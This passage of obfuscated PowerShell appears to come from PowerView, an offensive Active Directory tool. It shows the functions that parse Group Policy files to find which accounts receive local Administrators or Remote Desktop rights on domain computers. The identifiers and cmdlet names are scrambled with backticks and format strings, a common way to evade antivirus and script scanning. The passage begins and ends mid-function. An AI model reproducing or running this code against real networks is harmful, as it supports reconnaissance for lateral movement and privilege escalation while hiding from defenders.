        ${s`p`liToPTIOn} =   (&("{2}{0}{1}" -f 'iaBl','e','var') ("sL7H"+"d"))."v`Alue"::"rEmO`VeemPtY`ENT`R`Ies"
    }

    PROCESS {
        if (${psBOunDpA`R`A`Met`eRS}[("{0}{2}{1}" -f 'Ide','tity','n')]) { ${SeArCHeraR`G`UmeN`Ts}[("{1}{0}" -f 'ity','Ident')] = ${IDEN`TiTy} }

        &("{0}{2}{1}"-f'Get-D','GPO','omain') @SearcherArguments | &("{0}{1}{2}{3}"-f'Fo','rEa','ch-Ob','ject') {
            ${gPO`Disp`l`AYn`AmE} = ${_}."D`ISPlA`YnA`mE"
            ${G`pOnamE} = ${_}."Na`mE"
            ${g`pOP`AtH} = ${_}."G`pcf`iLe`Sy`spATH"

            ${pA`RSeAR`gs} =  @{ ("{3}{2}{0}{1}"-f'a','th','TmplP','Gpt') = ("$GPOPath\MACHINE\Microsoft\Windows "+('N'+'T{'+'0}SecE'+'dit{0'+'}GptTmp'+'l.inf') -f  [cHAr]92) }
            if (${P`sb`o`UND`P`ARAMETErs}[("{0}{1}{2}" -f'Cre','de','ntial')]) { ${Par`SEA`RGS}[("{1}{2}{0}"-f'tial','Cr','eden')] = ${Cr`E`DENtiaL} }

            
            ${i`NF} = &("{2}{1}{3}{0}"-f'pl','G','Get-','ptTm') @ParseArgs

            if (${i`NF} -and (${i`Nf}."Ps`BA`sE"."k`eyS" -contains ("{1}{2}{0}" -f 'ip','Grou','p Membersh'))) {
                ${m`embers`hI`pS} = @{}

                
                ForEach (${mE`m`BER`SHiP} in ${I`Nf}.'Group Membership'.("{3}{1}{0}{2}"-f'ato','r','r','GetEnume').Invoke()) {
                    ${g`RO`Up}, ${rE`La`TION} = ${MeM`Ber`Sh`Ip}."k`eY".("{0}{1}"-f'Spli','t').Invoke('__', ${SpL`It`opTiON}) | &("{0}{1}{2}"-f'For','Each-Obje','ct') {${_}.("{0}{1}"-f'Tr','im').Invoke()}
                    
                    ${M`EMB`eR`SHipvAL`UE} = ${m`eMBE`Rsh`IP}."vAl`Ue" | &("{1}{0}{2}{3}" -f 'ere','Wh','-','Object') {${_}} | &("{0}{1}{3}{2}" -f'ForEa','ch-O','t','bjec') { ${_}.("{1}{0}" -f'm','Tri').Invoke('*') } | &("{0}{2}{1}" -f'Where-','ct','Obje') {${_}}

                    if (${psB`OU`NDpa`RAMET`eRs}[("{2}{3}{4}{5}{1}{0}" -f 'ToSIDs','rs','Resolv','eMe','mb','e')]) {
                        
                        ${grouPMem`B`ers} = @()
                        ForEach (${me`m`Ber} in ${M`embErs`hi`PValUe}) {
                            if (${m`EmBEr} -and (${Me`mBeR}.("{0}{1}"-f'Tri','m').Invoke() -ne '')) {
                                if (${M`eMBEr} -notmatch ("{1}{0}" -f'.*','^S-1-')) {
                                    ${C`o`NvERtToa`RgU`MEN`TS} = @{("{2}{1}{0}" -f 'me','tNa','Objec') = ${mEmb`ER}}
                                    if (${PS`BOu`NDParAmeT`ers}[("{1}{0}"-f 'ain','Dom')]) { ${cOnv`er`TTOarGume`NtS}[("{1}{0}" -f 'ain','Dom')] = ${d`OmAIN} }
                                    ${M`e`MbErsID} = &("{1}{0}{2}{3}{4}"-f 'ver','Con','tT','o-','SID') @ConvertToArguments

                                    if (${M`EM`Ber`sId}) {
                                        ${g`RouPM`EmBe`RS} += ${M`emBe`RsID}
                                    }
                                    else {
                                        ${G`Ro`UPMEM`BE`Rs} += ${M`e`MbER}
                                    }
                                }
                                else {
                                    ${GRO`Up`memBERs} += ${MEM`BEr}
                                }
                            }
                        }
                        ${ME`M`BErs`hiPVaL`UE} = ${GR`oup`M`embeRS}
                    }

                    if (-not ${Mem`BerSH`IPs}[${gRo`Up}]) {
                        ${M`EMbeRs`hI`ps}[${g`Ro`UP}] = @{}
                    }
                    if (${MeMBErS`HIPv`AL`UE} -isnot [System.Array]) {${meMBER`Sh`I`Pv`A`LuE} = @(${MEm`B`e`RsHiPvAlUE})}
                    ${mem`BerSh`IpS}[${Gro`UP}].("{1}{0}"-f 'dd','A').Invoke(${RELaTI`On}, ${MEMBerS`hip`VA`lue})
                }

                ForEach (${membE`R`s`HIp} in ${MEmb`ersHi`ps}.("{0}{2}{1}"-f'Ge','numerator','tE').Invoke()) {
                    if (${mEmB`eRs`hiP} -and ${me`mbE`Rsh`ip}."k`ey" -and (${mEmbER`S`HIp}."K`ey" -match '^\*')) {
                        
                        ${g`ROUPSID} = ${m`emBersh`ip}."k`Ey".("{1}{0}" -f'im','Tr').Invoke('*')
                        if (${grO`U`Ps`Id} -and (${G`R`OUp`SId}.("{0}{1}"-f 'T','rim').Invoke() -ne '')) {
                            ${GR`OuPNa`me} = &("{3}{2}{1}{0}"-f 'm-SID','o','Fr','Convert') -ObjectSID ${g`RO`U`Psid} @ConvertArguments
                        }
                        else {
                            ${g`R`oUp`NaMe} = ${Fa`L`se}
                        }
                    }
                    else {
                        ${gR`OU`PnamE} = ${M`Embers`hip}."k`ey"

                        if (${G`Roup`N`AME} -and (${Gr`o`U`PnaME}.("{1}{0}"-f 'im','Tr').Invoke() -ne '')) {
                            if (${gR`Ou`pNa`Me} -match ("{3}{0}{1}{4}{2}"-f'i','str','rs','Admin','ato')) {
                                ${gROu`p`s`iD} = ("{0}{3}{1}{2}" -f 'S','5-32-','544','-1-')
                            }
                            elseif (${GR`oU`pname} -match ("{0}{1}{2}"-f'Remote ','Desk','top')) {
                                ${G`RouPs`iD} = ("{2}{3}{0}{1}"-f '5','55','S-1-5-3','2-')
                            }
                            elseif (${G`RO`U`pName} -match ("{0}{1}" -f'Guest','s')) {
                                ${G`ROU`psId} = ("{0}{2}{1}"-f 'S-1','546','-5-32-')
                            }
                            elseif (${grO`U`Pna`ME}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') {
                                ${coNvERtTo`ARg`Um`ENtS} = @{("{2}{1}{0}"-f'e','jectNam','Ob') = ${g`RouP`NaME}}
                                if (${ps`BOu`N`dPAR`AMe`TeRs}[("{0}{1}" -f'Dom','ain')]) { ${Co`Nver`T`To`Arg`UMe`Nts}[("{0}{1}"-f'Doma','in')] = ${D`OMA`IN} }
                                ${g`RoUP`SiD} = &("{2}{0}{1}" -f'n','vertTo-SID','Co') @ConvertToArguments
                            }
                            else {
                                ${G`RouP`SiD} = ${n`UlL}
                            }
                        }
                    }

                    ${G`pog`RoUp} = &("{0}{1}{2}" -f 'Ne','w-Obj','ect') ("{0}{1}"-f'PSO','bject')
                    ${GPOG`R`OUP} | &("{3}{2}{0}{1}"-f'd','-Member','d','A') ("{1}{3}{0}{2}" -f 'oper','No','ty','tepr') ("{0}{3}{1}{2}"-f 'GPOD','yNa','me','ispla') ${g`poDiSp`LAY`NaMe}
                    ${G`p`OgRouP} | &("{0}{1}{2}" -f'Add-','Membe','r') ("{0}{1}{2}"-f'No','te','property') ("{1}{0}" -f 'me','GPONa') ${G`poNAME}
                    ${gpO`G`R`oUp} | &("{2}{0}{1}" -f 'Memb','er','Add-') ("{1}{2}{0}{3}"-f'pert','Notep','ro','y') ("{0}{1}"-f 'G','POPath') ${g`popA`TH}
                    ${GPOGr`O`Up} | &("{1}{2}{0}"-f 'ber','Add-Me','m') ("{2}{0}{3}{1}"-f 'ep','y','Not','ropert') ("{2}{0}{1}"-f 'Typ','e','GPO') ("{1}{3}{2}{0}" -f 'edGroups','Restr','ct','i')
                    ${GpO`gr`OUp} | &("{1}{2}{0}"-f 'r','Add-Memb','e') ("{2}{0}{1}"-f'otepropert','y','N') ("{1}{0}"-f's','Filter') ${NU`Ll}
                    ${g`Pogr`OuP} | &("{0}{1}{3}{2}" -f'Add','-Me','r','mbe') ("{0}{1}{2}"-f'Notep','ropert','y') ("{3}{2}{1}{0}" -f'ame','N','p','Grou') ${gr`O`UPNAMe}
                    ${Gp`oGrO`UP} | &("{0}{1}{2}"-f'Add-M','em','ber') ("{3}{1}{0}{2}"-f 'o','r','perty','Notep') ("{0}{1}{2}"-f 'G','roupSI','D') ${gROUps`id}
                    ${gpoGr`ouP} | &("{0}{2}{3}{1}"-f'A','ember','d','d-M') ("{1}{2}{0}" -f'y','Noteprope','rt') ("{3}{0}{1}{2}"-f 'pMembe','rO','f','Grou') ${mEMB`Er`sHIp}."VAl`UE"."m`emB`erof"
                    ${gpog`Ro`Up} | &("{1}{2}{0}" -f'r','Add-','Membe') ("{3}{2}{0}{1}" -f'epropert','y','ot','N') ("{3}{1}{2}{0}"-f 'rs','oupM','embe','Gr') ${M`EmBErs`h`iP}."va`LUE"."me`mBE`Rs"
                    ${g`p`OgrOuP}."PSob`jE`cT"."tYpEnaM`eS".("{1}{0}" -f 'sert','In').Invoke(0, ("{0}{1}{2}{4}{3}"-f'P','owerView.','GP','Group','O'))
                    ${Gp`OGr`ouP}
                }
            }

            
            ${p`AR`sEargs} =  @{
                ("{0}{1}{2}" -f'Gr','ou','psXMLpath') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            &("{3}{0}{1}{2}"-f 'et','-','GroupsXML','G') @ParseArgs | &("{3}{2}{0}{4}{1}" -f '-Ob','ct','ch','ForEa','je') {
                if (${p`SBoUndpA`RAM`ETE`RS}[("{3}{2}{0}{1}{4}" -f'veMemb','ersToS','sol','Re','IDs')]) {
                    ${GrOuPMe`MbE`RS} = @()
                    ForEach (${me`m`BeR} in ${_}."grOUPmE`mB`eRS") {
                        if (${m`E`MbeR} -and (${meM`B`eR}.("{1}{0}" -f'm','Tri').Invoke() -ne '')) {
                            if (${M`EMBeR} -notmatch ("{1}{0}" -f 'S-1-.*','^')) {

                                
                                ${cOnVerT`TOA`Rg`UmE`N`Ts} = @{("{0}{1}{3}{2}" -f 'O','bj','ame','ectN') = ${GrOuPn`A`ME}}
                                if (${pSBO`UN`DpARAme`T`Ers}[("{1}{0}" -f'ain','Dom')]) { ${c`on`VERTtOaRGUmEn`TS}[("{0}{2}{1}" -f'Dom','n','ai')] = ${do`m`AiN} }
                                ${MeMBeR`s`ID} = &("{4}{3}{0}{2}{1}" -f'-S','D','I','onvertTo','C') -Domain ${DO`M`Ain} -ObjectName ${M`em`BEr}

                                if (${mEm`BE`RSiD}) {
                                    ${G`R`OuPm`EmbERS} += ${M`e`mBErSId}
                                }
                                else {
                                    ${gr`OuPM`em`BErS} += ${me`Mb`ER}
                                }
                            }
                            else {
                                ${gr`OuPM`eM`BERS} += ${mEMb`ER}
                            }
                        }
                    }
                    ${_}."GRoUp`Me`mb`eRs" = ${gRO`UpmeMBE`Rs}
                }

                ${_} | &("{2}{1}{0}" -f 'ember','-M','Add') ("{0}{1}{2}"-f'Note','proper','ty') ("{3}{1}{0}{2}" -f'ayN','l','ame','GPODisp') ${G`PoD`IsPLAyN`AmE}
                ${_} | &("{2}{0}{1}{3}" -f 'd-Mem','be','Ad','r') ("{2}{0}{3}{1}" -f 'oteprop','rty','N','e') ("{0}{2}{1}" -f'GP','Name','O') ${gpo`N`AMe}
                ${_} | &("{2}{0}{1}" -f 'd-Me','mber','Ad') ("{2}{0}{1}"-f 'pert','y','Notepro') ("{1}{0}{2}" -f'O','GP','Type') ("{1}{2}{4}{0}{3}" -f'reference','GroupPolic','y','s','P')
                ${_}."PSo`BJEcT"."t`Yp`ENAMeS".("{1}{0}"-f 'nsert','I').Invoke(0, ("{4}{3}{0}{1}{2}" -f 'iew.GP','O','Group','werV','Po'))
                ${_}
            }
        }
    }
}


function gEt`-do`MAING`Po`UseRlocaLgrOupma`PpInG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f'PS','hould','S','Process'}, '')]
    [OutputType({"{3}{9}{1}{4}{2}{8}{6}{0}{5}{10}{7}"-f 'rLocalGro','View','P','P','.G','u','se','g','OU','ower','pMappin'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITion = 0, ValUeFROmPiPeliNE = ${TR`UE}, vALUEFROmPIPEliNEbyproperTYnAME = ${T`RuE})]
        [Alias({"{4}{3}{0}{1}{2}" -f 'guish','edNam','e','in','Dist'}, {"{1}{2}{0}{3}"-f 'n','S','amAccou','tName'}, {"{0}{1}"-f 'Nam','e'})]
        [String]
        ${ideNT`i`TY},

        [String]
        [ValidateSet({"{2}{0}{3}{1}" -f'str','ors','Admini','at'}, {"{0}{2}{1}{3}" -f'S','-','-1-5-32','544'}, 'RDP', {"{3}{0}{1}{2}"-f' Des','ktop U','sers','Remote'}, {"{3}{1}{2}{0}"-f'555','3','2-','S-1-5-'})]
        ${L`OCalGR`OuP} = ("{1}{2}{0}{3}" -f 'n','A','dmi','istrators'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'DSPa','A','th'})]
        [String]
        ${sEa`R`C`HbasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{5}{2}{3}{4}{1}"-f 'D','r','nCon','trol','le','omai'})]
        [String]
        ${SeR`VeR},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{1}{0}{2}"-f'neLe','O','vel'}, {"{0}{1}"-f'Subtr','ee'})]
        [String]
        ${SeAR`ch`scO`PE} = ("{1}{2}{0}"-f 'tree','Su','b'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`E`SUltP`AGEsI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`VErti`mEl`IMit},

        [Switch]
        ${tO`MbS`TOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRED`en`Tial} =   (  &("{0}{1}{2}"-f'V','ar','Iable')  ("Jh3x"+"O6"))."vA`lUE"::"EmP`Ty"
    )

    BEGIN {
        ${Com`mO`Nar`Gu`mEnts} = @{}
        if (${psbOUndp`ARaM`e`TeRs}[("{0}{1}{2}"-f 'Dom','ai','n')]) { ${CoMMON`A`Rg`UMe`Nts}[("{0}{1}"-f 'Dom','ain')] = ${dom`A`iN} }
        if (${P`S`BoundP`Ar`Ameters}[("{0}{1}{2}" -f'Se','r','ver')]) { ${C`omMoN`ARGU`MENts}[("{1}{0}{2}" -f'erve','S','r')] = ${S`eRVer} }
        if (${P`sBounD`pAR`AmEteRs}[("{1}{0}{2}" -f 'earchSco','S','pe')]) { ${CoMMon`AR`GUmENts}[("{0}{2}{1}" -f 'S','rchScope','ea')] = ${se`Ar`chSc`Ope} }
        if (${p`s`BO`U`NDParamE`TErs}[("{3}{2}{1}{0}"-f'e','iz','ultPageS','Res')]) { ${cO`MmONA`RgumeNTS}[("{0}{1}{3}{4}{2}" -f'Re','sult','e','Pag','eSiz')] = ${re`sUltPAge`Si`ze} }
        if (${PsbOuN`dP`ARA`mEt`ErS}[("{2}{3}{1}{4}{0}" -f 'it','me','S','erverTi','Lim')]) { ${C`OMMONa`RG`UmeNts}[("{1}{2}{0}{3}" -f'Lim','ServerTi','me','it')] = ${ser`V`ERtim`eLImit} }
        if (${p`S`BoU`NdP`ArAMe`TErS}[("{2}{1}{0}"-f'e','ton','Tombs')]) { ${C`OMMoN`ArgUm`en`Ts}[("{0}{2}{1}" -f'To','one','mbst')] = ${tOmbS`T`OnE} }
        if (${PS`BouN`dpaRa`mETErs}[("{1}{0}{2}" -f 'entia','Cred','l')]) { ${cOMmo`NArGu`meNTS}[("{2}{0}{1}"-f'entia','l','Cred')] = ${CR`edE`NTi`AL} }
    }

    PROCESS {
        ${tArg`Ets`iDS} = @()

        if (${pS`BOu`NDPArA`mE`TeRS}[("{1}{0}{2}"-f 't','Iden','ity')]) {
            ${t`Ar`G`ETSIDs} += &("{2}{0}{1}{3}" -f 'a','in','Get-Dom','Object') @CommonArguments -Identity ${i`DEnTITY} | &("{2}{1}{0}"-f'ject','elect-Ob','S') -Expand ("{1}{0}"-f 'bjectsid','o')
            ${T`ARgEto`B`JEcT`siD} = ${TARg`ETs`ids}
            if (-not ${TARG`Ets`IDs}) {
                Throw ('[Get-D'+'om'+'ainGPO'+'UserLocalG'+'roupM'+'app'+'i'+'ng] '+'Una'+'bl'+'e '+'t'+'o '+'retrie'+'ve'+' '+'SID'+' '+'fo'+'r '+'iden'+'tity '+"'$Identity'")
            }
        }
        else {
            
            ${tA`R`gE`TSidS} = @('*')
        }

        if (${lo`C`AlGRoUP} -match ("{1}{0}" -f '5','S-1-')) {
            ${TARget`lOCA`lS`ID} = ${LO`cA`lgRoup}
        }
        elseif (${l`o`CalgR`OuP} -match ("{0}{1}"-f 'Adm','in')) {
            ${TAR`gETloc`A`l`SiD} = ("{0}{1}{2}"-f'S-','1-','5-32-544')
        }
        else {
            
            ${TaR`Get`L`ocalSId} = ("{0}{1}{2}" -f 'S','-1-5-32-','555')
        }

        if (${t`AR`GeTS`IdS}[0] -ne '*') {
            ForEach (${TAR`GEt`S`Id} in ${t`A`RGE`TSIDS}) {
                &("{2}{1}{0}"-f'se','bo','Write-Ver') ('[Get-'+'D'+'oma'+'inGPOUserLoc'+'al'+'Grou'+'pM'+'app'+'in'+'g]'+' '+'En'+'um'+'eratin'+'g '+'nested'+' '+'gr'+'oup '+'me'+'mbershi'+'ps'+' '+'for'+': '+"'$TargetSid'")
                ${tA`RGet`s`ids} += &("{1}{2}{3}{0}"-f'omainGroup','Ge','t','-D') @CommonArguments -Properties ("{2}{1}{0}"-f'tsid','c','obje') -MemberIdentity ${TAR`GEt`sID} | &("{3}{4}{1}{0}{2}"-f'-Ob','t','ject','Se','lec') -ExpandProperty ("{2}{1}{0}"-f'ctsid','je','ob')
            }
        }

        &("{1}{2}{0}"-f'se','Wr','ite-Verbo') ('[Get-'+'D'+'om'+'a'+'inG'+'POUs'+'erLoca'+'lGrou'+'pMap'+'ping] '+'Tar'+'get '+'localgr'+'oup'+' '+'SI'+'D: '+"$TargetLocalSID")
        &("{3}{0}{1}{2}" -f 'e','rbo','se','Write-V') ('[Get'+'-'+'D'+'o'+'mainGPOUse'+'rL'+'ocalGroupM'+'a'+'p'+'pi'+'ng'+'] '+'Eff'+'ec'+'tive'+' '+'t'+'arget '+'dom'+'a'+'in '+'S'+'IDs: '+"$TargetSIDs")

        ${g`p`OgrOupS} = &("{2}{1}{0}{3}" -f'GPOLocal','t-Domain','Ge','Group') @CommonArguments -ResolveMembersToSIDs | &("{1}{3}{2}{0}"-f't','F','jec','orEach-Ob') {
            ${gP`OgroUP} = ${_}
            
            if (${GPOg`RO`UP}."GROuP`s`Id" -match ${tarGe`TlOCA`lS`id}) {
                ${g`P`oGRo`Up}."Gr`OUPMe`MBE`RS" | &("{3}{1}{0}{2}" -f'je','ere-Ob','ct','Wh') {${_}} | &("{1}{2}{4}{0}{3}" -f'ec','ForE','ach','t','-Obj') {
                    if ( (${t`A`R`GeTsidS}[0] -eq '*') -or (${TAr`geTs`idS} -Contains ${_}) ) {
                        ${gpo`G`R`OuP}
                    }
                }
            }
            
            if ( (${GpO`g`ROUP}."GRO`Up`MEmBerOf" -contains ${T`ARgE`TLoCA`LsID}) ) {
                if ( (${TARg`etsI`dS}[0] -eq '*') -or (${T`AR`GET`Sids} -Contains ${GpO`g`RoUp}."G`R`oUPSiD") ) {
                    ${G`pogRo`UP}
                }
            }
        } | &("{0}{1}{2}"-f 'Sort-O','bje','ct') -Property ("{0}{1}"-f'GPO','Name') -Unique

        ${Gp`O`gRoUPs} | &("{2}{0}{1}"-f 'e','ct','Where-Obj') {${_}} | &("{4}{1}{0}{3}{2}"-f 'E','r','h-Object','ac','Fo') {
            ${Gp`oNAME} = ${_}."gp`OD`i`sPlAYNAme"
            ${gpo`GU`Id} = ${_}."gpo`N`Ame"
            ${gpop`A`TH} = ${_}."gP`OpATH"
            ${gpot`Y`Pe} = ${_}."Gpoty`pe"
            if (${_}."GR`ouPmE`mbeRs") {
                ${GPO`m`EMb`ERS} = ${_}."g`ROUpMeM`B`Ers"
            }
            else {
                ${g`p`OMEm`BERS} = ${_}."g`ROuP`Sid"
            }

            ${f`IL`TeRs} = ${_}."FiL`Te`Rs"

            if (${TaRgE`T`sIDS}[0] -eq '*') {
                
                ${T`A`RG`ETOBJeCTsIDs} = ${GPOMEM`Be`RS}
            }
            else {
                ${T`A`R`G`ETObj`ecTSIDS} = ${TA`R`gE`To`BJEC`TsId}
            }

            
            &("{0}{1}{2}" -f 'Get-Do','main','OU') @CommonArguments -Raw -Properties ("{5}{2}{3}{0}{4}{1}" -f'tingu','name','i','s','ished','name,d') -GPLink ${GPoG`UId} | &("{1}{0}{2}"-f '-O','ForEach','bject') {
                if (${FiL`T`Ers}) {
                    ${o`Uc`Om`PuTerS} = &("{4}{1}{0}{3}{2}"-f'nCompu','ai','er','t','Get-Dom') @CommonArguments -Properties ("{5}{3}{2}{1}{0}{4}" -f 'guishedn','me,distin','na','st','ame','dnsho') -SearchBase ${_}."p`Ath" | &("{2}{0}{1}"-f 'ere-Ob','ject','Wh') {${_}."dIsTI`Ng`UiSh`eD`N`AMe" -match (${F`iltErS}."V`AluE")} | &("{1}{0}{2}{3}"-f'elec','S','t-Obje','ct') -ExpandProperty ("{1}{0}{3}{2}" -f'ostn','dnsh','e','am')
                }
                else {
                    ${o`UcoMpUT`ERS} = &("{5}{3}{4}{2}{0}{1}" -f 'inCo','mputer','ma','t','-Do','Ge') @CommonArguments -Properties ("{1}{3}{2}{0}" -f 'ame','dnsh','n','ost') -SearchBase ${_}."Pa`Th" | &("{1}{3}{0}{2}"-f'Obj','S','ect','elect-') -ExpandProperty ("{0}{2}{1}"-f 'dnsh','me','ostna')
                }

                if (${O`Uc`ompUte`RS}) {
                    if (${OuC`omPut`ers} -isnot [System.Array]) {${OuCOMp`U`T`eRS} = @(${OUComp`Ut`E`RS})}

                    ForEach (${taR`G`etsiD} in ${ta`RGETOB`jecT`Si`dS}) {
                        ${oB`jEct} = &("{0}{3}{1}{2}"-f'Get-D','jec','t','omainOb') @CommonArguments -Identity ${t`ARGetS`Id} -Properties ("{6}{4}{0}{12}{2}{10}{5}{9}{13}{15}{8}{14}{1}{7}{11}{3}"-f'yp','s','mac','tsid','untt','un','samacco','hedname','di','t','co',',objec','e,sa','n','stingui','ame,')

                        ${i`SG`Roup} = @(("{1}{2}{0}"-f '5456','2','6843'),("{2}{0}{1}" -f'843545','7','26'),("{1}{0}{2}" -f'3','5','6870912'),("{1}{3}{0}{2}"-f'09','5368','13','7')) -contains ${Ob`jEct}."s`AmAC`cOunTty`pE"

                        ${gP`OL`OCAlGR`ouPMAP`PinG} = &("{1}{2}{3}{0}"-f 'ct','New','-','Obje') ("{0}{1}"-f 'PSOb','ject')
                        ${gp`Ol`ocAlgro`UP`m`APp`ing} | &("{0}{1}{3}{2}"-f 'Ad','d-M','ber','em') ("{1}{3}{0}{2}" -f'pr','Not','operty','e') ("{0}{2}{1}"-f 'O','e','bjectNam') ${OBj`E`ct}."sama`cCOunT`Na`mE"
                        ${GpOlO`CAl`gr`oUp`map`PiNG} | &("{0}{1}{2}" -f'Add-Mem','be','r') ("{0}{1}{2}" -f 'N','ote','property') ("{0}{2}{1}"-f 'Objec','DN','t') ${O`BJect}."DI`St`ing`UisHEDnAmE"
                        ${g`PoLOCAlG`RO`U`PMaPPinG} | &("{3}{0}{2}{1}"-f 'dd-Me','ber','m','A') ("{0}{2}{1}" -f'Notepr','perty','o') ("{0}{1}{2}"-f 'Object','S','ID') ${O`BJecT}."O`BJE`CtsiD"
                        ${gpo`Lo`cALGrOu`pMAP`Ping} | &("{2}{0}{1}" -f'dd-','Member','A') ("{0}{1}{2}" -f 'No','t','eproperty') ("{0}{1}"-f 'Domai','n') ${D`Oma`IN}
                        ${GpO`LOcA`lgR`O`UPMapP`I`Ng} | &("{2}{3}{0}{1}" -f 'Me','mber','Add','-') ("{2}{3}{1}{0}" -f 'ty','er','Not','eprop') ("{1}{2}{0}" -f'up','IsG','ro') ${is`g`ROup}
                        ${gpOl`oC`Al`gROUpMAP`piNG} | &("{0}{1}{2}" -f'Add-','Me','mber') ("{0}{2}{3}{1}"-f 'Note','ty','prope','r') ("{0}{1}{4}{3}{2}"-f'GP','ODi','Name','y','spla') ${g`Pon`AME}
                        ${GPolo`cAL`gRO`Up`Ma`ppiNg} | &("{1}{0}{2}"-f 'mbe','Add-Me','r') ("{0}{2}{1}"-f 'No','ty','teproper') ("{1}{0}"-f 'Guid','GPO') ${G`PoG`Uid}
                        ${GP`olo`CalGrOup`m`Ap`PiNg} | &("{2}{0}{1}"-f'dd-Memb','er','A') ("{3}{1}{2}{0}" -f 'ty','tep','roper','No') ("{0}{1}" -f'GPOPa','th') ${GP`o`pATH}
                        ${GPoLO`cAlgr`oU`pMaP`Ping} | &("{3}{1}{2}{0}"-f'r','d-','Membe','Ad') ("{0}{1}{2}" -f 'No','te','property') ("{1}{0}"-f'ype','GPOT') ${gPOtY`Pe}
                        ${gPO`loc`AlgROUP`Ma`ppiNG} | &("{1}{0}{2}{3}" -f 'em','Add-M','be','r') ("{0}{1}{2}"-f 'Notepr','o','perty') ("{3}{0}{1}{2}"-f 'ain','e','rName','Cont') ${_}."p`RO`pe`RTiEs"."DiSTiN`G`Uis`HEdna`ME"
                        ${Gp`olOcalgr`O`Up`MA`pP`ING} | &("{1}{2}{0}" -f'er','A','dd-Memb') ("{2}{0}{1}"-f'epropert','y','Not') ("{2}{0}{3}{1}" -f 'ompu','Name','C','ter') ${oucomp`UT`ErS}
                        ${g`P`olOc`Alg`RO`UP`MApping}."p`SoB`JeCT"."TyPE`N`AMeS".("{0}{2}{1}"-f'I','t','nser').Invoke(0, ("{3}{2}{0}{4}{5}{1}" -f 'Lo','apping','rView.GPO','Powe','calG','roupM'))
                        ${gPO`LoC`A`LgRouPm`APPInG}
                    }
                }
            }

            
            &("{1}{2}{0}{3}{4}" -f'D','Ge','t-','omainSi','te') @CommonArguments -Properties ("{2}{5}{6}{1}{4}{0}{3}" -f'distinguishedn','bl','si','ame',',','teo','bject') -GPLink ${g`p`ogUId} | &("{3}{0}{1}{2}" -f'rEach-Ob','j','ect','Fo') {
                ForEach (${TAr`GE`Ts`ID} in ${tA`R`gETObj`ect`sIDs}) {
                    ${Ob`je`cT} = &("{1}{2}{0}{3}"-f 'b','Get-D','omainO','ject') @CommonArguments -Identity ${TAR`gE`TSID} -Properties ("{6}{12}{0}{8}{1}{5}{4}{11}{3}{2}{14}{10}{9}{13}{7}" -f 'acco','typ','stingu','me,di','acco','e,sam','sa','ctsid','unt','me,obj','hedna','untna','m','e','is')

                    ${iSg`ROup} = @(("{1}{2}{0}"-f '35456','268','4'),("{1}{0}{2}"-f '6','2','8435457'),("{2}{0}{1}{3}"-f'68709','1','53','2'),("{0}{1}{2}" -f'53','687091','3')) -contains ${oBj`ect}."SAM`ACcoun`Tty`Pe"

                    ${G`polO`CAl`Gr`OU`PMApPINg} = &("{1}{2}{0}"-f 'bject','Ne','w-O') ("{1}{0}{2}"-f 'SObje','P','ct')
                    ${GpOLOC`ALGr`Ou`PmA`PPinG} | &("{0}{2}{1}" -f'Add-Mem','er','b') ("{3}{1}{2}{0}" -f 'erty','e','prop','Not') ("{2}{1}{0}" -f'Name','ject','Ob') ${Obj`e`CT}."S`AMACCOu`NT`NAme"
                    ${GpoLO`cA`L`GrOu`PMapP`i`Ng} | &("{1}{2}{0}" -f 'r','Ad','d-Membe') ("{3}{1}{2}{0}"-f 'roperty','ot','ep','N') ("{0}{1}{2}"-f'Ob','je','ctDN') ${O`Bj`EcT}."D`i`stINGuIs`H`e`DnaMe"
                    ${gP`oLOCalGrO`UP`mAPPinG} | &("{1}{0}{2}" -f'Me','Add-','mber') ("{0}{1}{2}" -f 'N','oteprop','erty') ("{0}{1}{2}" -f 'Obj','e','ctSID') ${O`Bje`CT}."o`BjeCts`id"
                    ${gPOLocAlGrOUPmap`P`I`NG} | &("{0}{3}{2}{1}" -f'Add','er','mb','-Me') ("{2}{1}{3}{0}" -f'rty','otep','N','rope') ("{0}{1}" -f 'IsGro','up') ${ISG`R`oup}
                    ${G`pOLO`caLGrO`UPmaPP`ing} | &("{1}{2}{0}"-f'-Member','A','dd') ("{2}{0}{1}" -f'oper','ty','Notepr') ("{1}{0}" -f 'in','Doma') ${D`omAiN}
                    ${g`pOL`OcalGrO`Upm`AP`pinG} | &("{1}{2}{0}"-f 'mber','Add-M','e') ("{1}{3}{2}{0}" -f'rty','Notepr','pe','o') ("{2}{0}{3}{4}{1}" -f 'ODi','ayName','GP','sp','l') ${gPon`A`me}
                    ${g`pO`lOcA`LGrouPM`Ap`PI`Ng} | &("{1}{2}{0}"-f 'ber','Add','-Mem') ("{1}{2}{3}{0}"-f 'perty','Not','epr','o') ("{1}{2}{0}"-f 'OGuid','G','P') ${gP`o`gUID}
                    ${gP`OLOCAl`grOu`P`maPPING} | &("{2}{0}{1}"-f'm','ber','Add-Me') ("{2}{0}{1}{3}" -f'e','prop','Not','erty') ("{0}{1}{2}" -f'GPOP','at','h') ${GPO`PaTh}
                    ${g`P`olo`C`ALgrouP`mapPiNg} | &("{1}{0}{3}{2}"-f'dd-M','A','er','emb') ("{2}{3}{1}{0}"-f 'rty','ope','Notep','r') ("{2}{1}{0}" -f'ype','T','GPO') ${GPOT`yPE}
                    ${gPo`lO`caLG`ROupMa`PpiNg} | &("{2}{1}{0}"-f 'er','mb','Add-Me') ("{0}{2}{1}"-f 'Noteprop','ty','er') ("{3}{1}{0}{2}" -f'r','aine','Name','Cont') ${_}."diSTIN`Gu`i`Shedn`AMe"
                    ${gp`OLocAl`G`RoupM`APP`INg} | &("{1}{2}{0}" -f 'er','Add-M','emb') ("{0}{1}{2}"-f'Notep','r','operty') ("{2}{0}{1}" -f'puterNam','e','Com') ${_}."s`ITe`objEC`TBl"
